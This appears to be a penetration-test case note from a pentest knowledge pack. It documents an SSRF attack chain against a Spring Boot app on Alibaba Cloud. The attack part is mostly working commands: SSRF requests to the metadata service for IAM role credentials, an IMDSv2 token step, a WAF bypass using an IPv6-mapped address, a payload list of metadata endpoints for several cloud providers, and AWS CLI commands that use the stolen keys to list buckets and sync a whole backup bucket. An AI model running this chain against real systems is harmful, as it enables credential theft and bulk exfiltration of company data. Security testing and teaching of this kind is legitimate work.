# [2026-02] SSRF → cloud metadata → AK/SK → full OSS data

## Scenario category
Web pentest / cloud security

## Target overview
Reach the cloud metadata service through an SSRF flaw in a web application, obtain temporary credentials, and ultimately export the entire contents of an OSS bucket.

## Full execution chain

1. Find SSRF in the image proxy endpoint
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (internal port probe succeeds)
   ```
2. Try reaching the cloud metadata service
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → returns the metadata directory listing
   ```
3. Get the IAM role name
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Get temporary credentials
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Enumerate OSS buckets with the credentials
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Identify sensitive buckets and export the data
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Pitfalls encountered

| Problem | Cause | Fix | Time lost |
|------|------|---------|------|
| WAF blocks 169.254 in the SSRF | IP blocklist | Bypass with the IPv6 form `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expire after an hour | Short STS token lifetime | Script an automatic token refresh | 10min |
| Metadata v2 requires a token | IMDSv2 protection | PUT for a token first, then send requests carrying it | 20min |

## Toolchain findings
- Alibaba Cloud and AWS use different metadata paths, so try each separately
- IMDSv2 needs a two-step request (PUT to get a token → GET carrying it)
- Some cloud providers now enable IMDSv2 by default, which raises the bar for SSRF

## Key code and commands

```bash
# IMDSv2 bypass (requires the SSRF to support custom methods and headers)
# Step 1: get a token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: send the request carrying the token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable patterns and script fragments

```bash
# Quick-check payload list for SSRF against cloud metadata
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Suggested improvements to this pack
- routing.md already has SSRF / cloud-security routes ✓
- Suggest adding a per-provider metadata path comparison table to pentest-tools/references

## Follow-up actions
- [ ] Add the cloud metadata path comparison table to references

## Environment
- Target: Alibaba Cloud ECS + OSS
- Web framework: Spring Boot 2.7
- SSRF type: fully reflected (full SSRF)
